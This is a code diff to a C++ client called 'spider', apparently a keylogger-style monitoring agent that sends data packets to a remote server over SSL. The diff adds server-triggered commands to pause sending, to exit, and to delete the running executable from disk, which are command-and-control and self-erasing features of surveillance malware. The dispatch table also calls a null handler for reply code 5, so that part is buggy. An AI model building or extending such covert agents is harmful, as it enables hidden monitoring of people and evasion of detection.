@@ -1,5 +1,6 @@
 #include <iostream>
 #include <boost/thread.hpp>
+#include <boost/filesystem.hpp>
 #include <boost/date_time/posix_time/posix_time.hpp>
 #include "reseau/Network.hh"
 #include "paquetFirstClient.hh"
@@ -12,6 +13,8 @@
 Network::Network(const std::string& port, const std::string& ip, Packager* packager) :
 	_port(port), _ip(ip), _ctx(boost::asio::ssl::context::sslv23), _packager(packager)
 {
+	_pause = 0;
+
 	boost::asio::ip::tcp::resolver resolver(_ios);
 	boost::asio::ip::tcp::resolver::query query(ip, port);
 	_iterator = resolver.resolve(query);
@@ -19,6 +22,13 @@ Network::Network(const std::string& port, const std::string& ip, Packager* packa
 	_ctx.load_verify_file(CERTIFICATE_FILE);
 	_ctx.set_verify_mode(boost::asio::ssl::context::verify_peer);
 	_engine = new SslEngine(_ios, _ctx);
+
+	_response[4] = nullptr;
+	_response[5] = nullptr;
+	_response[6] = &spider_exit;
+	_response[7] = &spider_pause;
+	_response[8] = &spider_remove;
+
 }
 
 
@@ -30,20 +40,18 @@ void Network::initNetwork() {
 		boost::asio::ip::tcp::endpoint endpoint = *_iterator;
 		boost::system::error_code ec;
 
-	    for (;;) {
-			std::cout << "Try to connect to the server" << std::endl;
-			_engine->getSocket().async_connect(endpoint, yield[ec]);
-		  if (!ec) {
-			  std::cout << "SSL: initializing HandShake" << std::endl;
-			  _engine->doHandshake(boost::asio::ssl::stream_base::client, yield);
-			  if (!ec) {
-				sendFirstPaquet(yield);
-			  }
-
-		  }
-		  _engine->getSocket().close();
-		}
-	  });
+		for (;;) {
+				std::cout << "Try to connect to the server" << std::endl;
+				_engine->getSocket().async_connect(endpoint, yield[ec]);
+				if (!ec) {
+					std::cout << "SSL: initializing HandShake" << std::endl;
+					_engine->doHandshake(boost::asio::ssl::stream_base::client, yield);
+					if (!ec) {
+						sendFirstPaquet(yield);
+					}
+				}
+				_engine->getSocket().close();
+		}});
 	_ios.run();
 }
 
@@ -90,10 +98,12 @@ void Network::writeLoop(boost::asio::yield_context yield)
 		_packager->isLeft();
 		std::cout << "Packager OK" << std::endl;
 		Paquet *paquet = _packager->getPaquet();
-		std::cout << "SENDING PAQUET: " << *paquet << std::endl;
-		if (_engine->writePaquet(*paquet, yield) == -1) {
-			return;
-		}
+			if (_pause == 0) {
+				std::cout << "SENDING PAQUET: " << *paquet << std::endl;
+				if (_engine->writePaquet(*paquet, yield) == -1) {
+					return;
+				}
+			}
 		_packager->supprPaquet();
 	}
 }
@@ -103,8 +113,36 @@ void Network::readLoop()
 	PaquetCommandServer paquet;
 
 	while (!_engine->read(paquet)) {
-		if (paquet.getReponse() == 6)
-			exit(EXIT_SUCCESS);
+		if (paquet.getReponse() > 4)
+			_response[paquet.getReponse()](*this);
 		std::cout << "Paquet recu: " << paquet << std::endl;
 	}
+}
+
+void spider_exit(Network& net) {
+	std::cout << "Exit spider" << std::endl;
+	exit(EXIT_SUCCESS);
+}
+
+void spider_remove(Network& net) {
+	HMODULE		hModule = GetModuleHandle(NULL);
+
+	if (hModule)
+	{
+		WCHAR	path[MAX_PATH];
+
+		GetModuleFileName(hModule, path, MAX_PATH);
+		std::wstring wpath = path;
+		std::string str(wpath.begin(), wpath.end());
+		std::cout << "Remove: " << str << std::endl;
+		if (boost::filesystem::exists(str))
+			boost::filesystem::remove(str);
+	}
+}
+
+void spider_pause(Network& net) {
+	if (net.getPause() == 0)
+		net.setPause(1);
+	else
+		net.setPause(0);
 }
